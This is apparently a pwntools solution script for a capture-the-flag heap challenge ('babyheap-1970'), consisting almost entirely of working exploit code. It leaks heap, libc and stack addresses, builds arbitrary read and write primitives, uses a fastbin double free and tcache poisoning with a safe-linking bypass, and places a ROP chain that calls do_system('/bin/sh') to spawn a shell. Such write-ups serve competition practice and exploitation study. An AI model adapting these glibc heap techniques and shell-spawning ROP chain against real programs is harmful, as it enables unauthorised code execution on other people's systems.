from pwn import *
import sys

elf = ELF("chall_patched")
libc = ELF("libc.so.6")

io = process(elf.path, timeout=3)
# io = remote('babyheap-1970.dom.seccon.games', 9999)

context.log_level = 'info'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

# - define functions - #
def select_edit():
	io.sendlineafter(b"Exit\n> ", b"1")

def type_is_ARRAY():
	io.recvuntil(b'Current: <')
	return io.recv(5) == b'ARRAY'

def update_array(idx_array: list, sz: int):
	select_edit()
	traverse(idx_array)
	if type_is_ARRAY():
		log.warn('ARRAY type cannot be updated.')
		return
	io.sendlineafter(b'> ', b'a')
	io.sendlineafter(b'size: ', str(sz).encode())

def update_value(idx_array: list, val):
	select_edit()
	traverse(idx_array)
	if type_is_ARRAY():
		log.warn('ARRAY type cannot be updated.')
		return
	io.sendlineafter(b'> ', b'v')
	io.sendlineafter(b'value: ', val)

def delete(idx_array: list):
	select_edit()
	traverse(idx_array[:-1])
	if not type_is_ARRAY():
		log.warn('Cannnot continue to traverse the tree.')
		return
	io.sendlineafter('index: ', str(idx_array[-1]).encode())
	io.sendlineafter(b'> ', b'2')

def copy(idx_array: list, dst_idx: int):
	select_edit()
	traverse(idx_array[:-1])
	if not type_is_ARRAY():
		log.warn('Cannnot continue to traverse the tree.')
		return
	io.sendlineafter('index: ', str(idx_array[-1]).encode())
	io.sendlineafter(b'> ', b'3')
	io.sendlineafter(b'index: ', str(dst_idx).encode())

def traverse(idx_array: list):
	if len(idx_array) == 0:
		return
	if type_is_ARRAY():
		io.sendlineafter('index: ', str(idx_array[0]).encode())
		io.sendlineafter(b'> ', b'1')
		traverse(idx_array[1:])

def select_list():
	io.sendlineafter(b"> ", b"2")


# - str_t.ref overflow - #
update_array([], 8)
update_array([0], 8)
for i in range(8):
	if i == 0:
		update_array([0, 0], 8)
	else:
		copy([0, 0], i)
		continue
	for j in range(8):
		if j == 0:
			update_array([0, 0, 0], 8)
		else:
			copy([0, 0, 0], j)
			continue
		for k in range(8):
			if k == 0:
				update_array([0, 0, 0, 0], 8)
			else:
				copy([0, 0, 0, 0], k)
				continue
			for l in range(4):
				if l == 0:
					update_value([0, 0, 0, 0, 0], b'hoge')
				else:
					copy([0, 0, 0, 0, 0], l)
					continue


# - heap leak - # 
copy([0, 0, 0, 0, 0], 4)
delete([0, 0, 0, 0, 4])
select_list()
io.recvuntil(b"[00] <S> ")
r = io.recv(5) + b"\x00\x00\x00"
io.recvuntil(b'MENU')
heap_addr = u64(r) << 12
victim_chunk_addr = heap_addr + 0x5f0
log.info(f'heap addr: {hex(heap_addr)}')

def safe_link(dst_addr: int, src_addr: int = heap_addr):
	return dst_addr ^ (src_addr >> 12)


# - prepare AAW - #
update_value([0, 0, 0, 0, 4], b'hoge')
idx_array = [] 
for i in range(8):
	update_array([1] + idx_array, 1)
	update_array([2] + idx_array, 8)
	idx_array.append(0)
delete([1]) # fill tcache[0x20]
delete([2]) # fill tcache[0x90] and one of them is linked to unroted bin
delete([0, 0, 0, 0, 4]) # fastbin[0x20] -> victim chunk -> ...
update_array([1], 1)

def AAR(addr: int):
	update_value([1, 0], str(addr).encode())
	select_list()
	io.recvuntil(b"[00] <S> ")
	return io.recvline(keepends=False)


# - libc leak - #
r = AAR(heap_addr + 0x14df0)
libc.address = u64(r.ljust(8, b'\x00')) - 0x219ce0
log.info(f'libc addr: {hex(libc.address)}')


# - stack leak - #
r = AAR(libc.sym["environ"])
return_addr = u64(r.ljust(8, b'\x00')) - 0x120
log.info(f'return addr @ {hex(return_addr)}')
aaw_addr = return_addr - 0x8


# - double free - #
update_value([1, 0], str(heap_addr + 0x15430).encode())
idx_array = []
for i in range(9):
	update_array([2] + idx_array, 6)
	idx_array.append(0)
delete([2]) # connect two chunks to fastbin[0x70]
delete([0, 0, 0, 0, 3]) # double free in fastbin[0x70]


# - prepare ROP chain as arr_t - #
p = p64(5) # arr_t->count
p += p64(next(libc.search(asm('pop rdi; ret'), executable=True))) # ROP chain as arr_t->data[]
p += p64(next(libc.search(b'/bin/sh\x00')))
p += p64(next(libc.search(asm('pop rsi; ret'), executable=True)))
p += p64(0)
p += p64(next(libc.search(asm('pop rdx; ret'), executable=True)))
p += p64(0)
# p += p64(next(libc.search(asm('ret'), executable=True)))
p += p64(libc.sym["do_system"] + 2)
update_value([2], p)

# - prepare fake chunk - #
p = b'A' * 0x8
p += p64(0x71)
p += p64(0)
p += p64(0x61)
update_value([3], p)
p = b'A' * 0x8 + p64(0x61)
update_value([4], p)


# tcache poisoning
for i in range(4):
	update_value([5], b'hoge') # empty tcache[0x70]

update_value([5], p64(safe_link(heap_addr + 0x157b0, src_addr = heap_addr + 0x15430))) # overwrite fd
update_value([6], b'hoge')
update_value([6], b'hoge')
update_array([6], 6) # arr_t to be rewritten


# - overwrite arr_t - #
rop_chain_addr = heap_addr + 0x154a0
overwrapping_chunk_addr = heap_addr + 0x15520

p = p64(4) # arr_t->count
p += p64(0xfeed0001) # arr_t->data[00]
p += p64(rop_chain_addr)
p += p64(0xfeed0001) # arr_t->data[01]
p += p64(overwrapping_chunk_addr)
p += p64(0xfeed0001) # arr_t->data[02]
p += p64(overwrapping_chunk_addr + 0x10)
p += p64(0) # arr_t->data[03]
update_value([7], p)


# - tcache poisoning - #
update_array([6, 3], 5)
delete([6, 3])
delete([6, 2])
delete([6, 1])
update_value([6, 1], b'A' * 8 + p64(0x61) + p64(safe_link(aaw_addr, src_addr = overwrapping_chunk_addr + 0x10)))
copy([6, 0], 2)
copy([6, 0], 3) # put ROP chain in the stack

io.sendlineafter(b'> ', b'0') # Bye

io.interactive()
